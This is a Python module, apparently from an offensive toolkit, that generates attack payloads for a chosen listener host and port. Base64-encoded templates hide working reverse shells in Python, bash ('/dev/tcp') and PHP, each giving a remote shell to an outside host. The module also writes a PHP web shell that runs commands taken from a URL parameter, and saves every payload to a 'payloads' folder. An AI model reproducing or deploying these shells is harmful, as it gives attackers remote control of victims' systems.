import os
import base64
from core.utils import colored


SHELL_TEMPLATES = {
    "python": base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldCgpCnMuY29ubmVjdCgoJ0xIT1NUJyxMUE9SVCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCnN1YnByb2Nlc3MuY2FsbChbJy9iaW4vc2gnLCctaSddKQo=").decode(),
    "bash": base64.b64decode("YmFzaCAtaSA+JiAvZGV2L3RjcC9MSE9TVC9MUE9SVCAwPiYx").decode(),
    "php": base64.b64decode("PD9waHAgJHM9ZnNvY2tvcGVuKCdMSE9TVCcsTFBPUlQpO2V4ZWMoJy9iaW4vc2ggLWkgPCYzID4mMyAyPiYzJyk7Pz4=").decode(),
    "powershell": "",
}

REV_SHELLS = {}

def _init():
    import re
    for lang, tmpl in SHELL_TEMPLATES.items():
        if tmpl:
            REV_SHELLS[lang] = tmpl


_init()


class PayloadFactory:
    def __init__(self):
        self.payload_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "payloads")
        os.makedirs(self.payload_dir, exist_ok=True)
        self.generated = []

    def _save(self, name, content, ext):
        path = os.path.join(self.payload_dir, name + "." + ext)
        with open(path, "wb" if isinstance(content, bytes) else "w") as f:
            f.write(content)
        size = os.path.getsize(path)
        self.generated.append((name + "." + ext, size))
        return path, size

    def _fmt_size(self, b):
        if b < 1024: return "%d B" % b
        if b < 1048576: return "%.1f KB" % (b / 1024.0)
        return "%.2f MB" % (b / 1048576.0)

    def generate_all(self, lhost, lport):
        print(colored("\n" + "=" * 50, "36"))
        print(colored("  PAYLOAD FACTORY - %s:%s" % (lhost, lport), "36"))
        print(colored("=" * 50 + "\n", "36"))

        count = 0

        for lang, tmpl in REV_SHELLS.items():
            code = tmpl.replace("LHOST", lhost).replace("LPORT", str(lport))
            ext_map = {"python": "py", "bash": "sh", "php": "php", "powershell": "ps1"}
            ext = ext_map.get(lang, "txt")
            path, size = self._save("revshell_%s" % lang, code, ext)
            print(colored("    [+] revshell_%s.%s (%s)" % (lang, ext, self._fmt_size(size)), "32"))
            count += 1

        webshells = {
            ("php", "php"): "<?php system($_GET['cmd']); ?>",
        }
        for (lang, ext), code in webshells.items():
            path, size = self._save("webshell_%s" % lang, code, ext)
            print(colored("    [+] webshell_%s.%s (%s)" % (lang, ext, self._fmt_size(size)), "32"))
            count += 1

        print(colored("\n" + "=" * 50, "36"))
        print(colored("  GENERATED %d PAYLOADS" % count, "32"))
        print(colored("  Saved to: %s" % self.payload_dir, "33"))
        print(colored("=" * 50, "36"))
        return self.generated


def run_payload(lhost, lport, lang=None):
    f = PayloadFactory()
    f.generate_all(lhost, lport)
